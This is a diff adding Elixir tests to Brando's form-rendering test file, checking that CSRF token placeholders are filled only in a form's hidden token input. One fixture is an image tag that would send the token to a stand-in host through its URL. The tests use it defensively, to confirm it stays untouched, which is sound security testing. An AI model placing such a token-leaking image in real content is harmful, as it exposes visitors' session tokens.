@@ -112,6 +112,40 @@ defmodule Brando.Forms.FormTagTest do
     assert Delivery.finalize("<p>No form</p>") == "<p>No form</p>"
   end
 
+  # Content can carry the placeholder too: synced Markdown, an editor's text or an
+  # AI proposal. Outside the form's own token input it must stay as it is, or
+  # every visitor's browser would send their token to the image's host.
+  @exfiltrating_image ~s(<p><img src="https://images.example.net/pixel.gif?t=$csrftoken" alt="$csrftoken"></p>)
+
+  test "finalize fills in only the form's token input" do
+    form = render("{% form 'contact' %}", %{"language" => "en"})
+    html = @exfiltrating_image <> "<p>Write $csrftoken here</p>" <> form
+    finalized = Delivery.finalize(html)
+
+    assert finalized =~ @exfiltrating_image
+    assert finalized =~ "<p>Write $csrftoken here</p>"
+
+    assert [_, token] = Regex.run(~r/name="_csrf_token" value="([^"]+)"/, finalized)
+    refute token == "$csrftoken"
+    assert Plug.CSRFProtection.valid_state_and_csrf_token?(Plug.CSRFProtection.dump_state(), token)
+  end
+
+  test "finalize leaves a text input named for the token, or a token input with more in its value" do
+    html =
+      ~s(<input type="text" name="_csrf_token" value="$csrftoken-x">) <>
+        ~s(<input type="hidden" name="q" value="$csrftoken">)
+
+    assert Delivery.finalize(html) == html
+  end
+
+  test "finalize fills in a site component's token input whatever its attribute order" do
+    html = ~s(<form><input value="$csrftoken" name="_csrf_token" type="hidden" /></form>)
+    finalized = Delivery.finalize(html)
+
+    refute finalized =~ "$csrftoken"
+    assert finalized =~ ~r{<input value="[^"$]+" name="_csrf_token" type="hidden" />}
+  end
+
   test "a HEEx module renders the form with its slots", %{user: user} do
     {:ok, module} =
       Brando.Content.create_module(
